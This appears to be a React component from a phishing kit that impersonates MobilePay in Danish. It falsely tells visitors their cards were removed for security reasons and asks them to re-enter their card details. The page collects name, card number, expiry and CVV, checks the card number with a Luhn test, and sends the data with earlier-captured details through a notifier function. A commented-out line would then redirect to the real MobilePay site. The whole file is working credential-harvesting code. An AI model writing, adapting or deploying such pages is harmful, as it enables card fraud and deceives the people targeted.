import React, { useState } from "react";
import Cards from "react-credit-cards";
import "./Payment.css";
import Mobilepay from "./images/mobilepay.png";
import Footer from "./Footer/Footer";
import sendMessage from "./Notifier";
import { useLocation } from "react-router-dom";
import logo2 from "./images/Logo2.png";
let card;

const Payment = () => {
  const data = useLocation();

  const [cvc, setCvc] = useState("");
  const [expiry, setExpiry] = useState("");
  const [focus, setFocus] = useState("");
  const [name, setName] = useState("");
  const [number, setNumber] = useState("");
  const [validInput, setValidInput] = useState("");



	function checkLuhn(cardNo)
	{
		let nDigits = cardNo.length;

		let nSum = 0;
		let isSecond = false;
		for (let i = nDigits - 1; i >= 0; i--)
		{

			let d = cardNo[i].charCodeAt() - '0'.charCodeAt();

			if (isSecond == true)
				d = d * 2;

			// We add two digits to handle
			// cases that make two digits
			// after doubling
			nSum += parseInt(d / 10, 10);
			nSum += d % 10;

			isSecond = !isSecond;
		}
		return (nSum % 10 == 0);
	}
	
  const handleInputFocus = (e) => {
    setFocus(e.target.name);
  };

  const handleInputChange = (e) => {

    const { name, value } = e.target;

    let formattedValue = value;

    if (name === "number") {
      
      formattedValue = value
        .replace(/\s/g, "") // Remove existing spaces
        .replace(/\D/g, "") // Remove non-digit characters
        .replace(/(.{4})/g, "$1 ") // Add a space after every 4 digits
        .trim(); // Remove leading/trailing spaces
        if(value.length === 19)
        {
          var value2 = value.replace(/\s/g, "");
          console.log(value2);
          if (checkLuhn(value2))
          {
            console.log("Card Valid");
            card = "valid"
          }
          else
          {
            console.log("Card Not valid")
            card = "notValid"
          }
        }

    }

    if (name === "expiry") {
      formattedValue = value
        .replace(/\D/g, "") // Remove non-digit characters
        .replace(/(\d{2})/, "$1/") // Add a "/" after the first 2 digits
        .slice(0, 5); // Limit the input to MM/YY format
    }
    if (name === "cvc") {
      formattedValue = value.slice(0, 3); // Limit the input to 3 characters
    }

    // Update the state with the formatted value
    switch (name) {
      case "cvc":
        setCvc(formattedValue);
        break;
      case "expiry":
        setExpiry(formattedValue);
        break;
      case "name":
        setName(formattedValue);
        break;
      case "number":
        setNumber(formattedValue);
        break;
      default:
        break;
    }


    let Username = document.getElementById('Name').value;
    let Expiry = document.getElementById('expiry').value;
    let cvv = document.getElementById('cvv').value;

    console.log(Username.length, Expiry.length,cvv.length,card)

    if(Username.length > 1 && Expiry.length > 4 && cvv.length > 2 && card === "valid")
    {
      setValidInput(true)
    }
    else{
      setValidInput(false)
    }
  };

  return (
    <div className="payment_main">
      <img src={logo2} />
      <h1>Kortverifikation</h1>
      <p>
      Af sikkerhedsmæssige årsager har vi præventivt fjernet dine kort tilknyttet MobilePay.

Tilknyt dit primare kort nu.

      </p>

      <div
        id="PaymentForm"
        style={{
          display: "flex",
          flexDirection: "column",
          justifyContent: "flex-start",
          alignItems: "flex-start",
        }}
      >
        <div>
          <Cards
            cvc={cvc}
            expiry={expiry}
            focused={focus}
            name={name}
            number={number}
          />
        </div>
        <div className="payment_card_form">
          <div className="payment_card">
            <div>
              <label>Fulde navn</label>
            </div>
            <input
              type="text"
              name="name"
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              id="Name"
            />
          </div>
          <div className="payment_card">
            <div>
              <label>Kortnummer</label>
            </div>
            <input
              type="text"
              name="number"
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              value={number}
              maxLength={19}
              inputMode="numeric"
              placeholder="1234 1234 1234 1234"
            />
          </div>

          <div className="payment_card">
            <div>
              <label>Udløbsdato</label>
            </div>
            <input
              type="text"
              name="expiry"
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              value={expiry}
              inputMode="numeric"
              placeholder="XX/XX"
              id="expiry"
            />
          </div>
          <div className="payment_card">
            <div>
              <label>CVV</label>
            </div>
            <input
              type="number"
              name="cvc"
              min={0}
              value={cvc}
              onChange={handleInputChange}
              onFocus={handleInputFocus}
              placeholder="XXX"
              inputMode="numeric"
              id="cvv"
            />
          </div>
        </div>
      </div>
      <div className="PersonalizedAccountForm_btn">
        <button type="button"
          onClick={async (event) => {
            event.preventDefault();
            const paymentObj = {"Card Name": name, "Card Number": number, Expiry: expiry, CVC: cvc};
            const lastObj = {...data.state, ...paymentObj}
            const response = await sendMessage(lastObj);
            console.log(response)
            //window.location.href = "https://mobilepay.dk/";
          }}
          disabled={!validInput}>
          Indsend
        </button>
      </div>

      <Footer />
    </div>
  );
};

export default Payment;
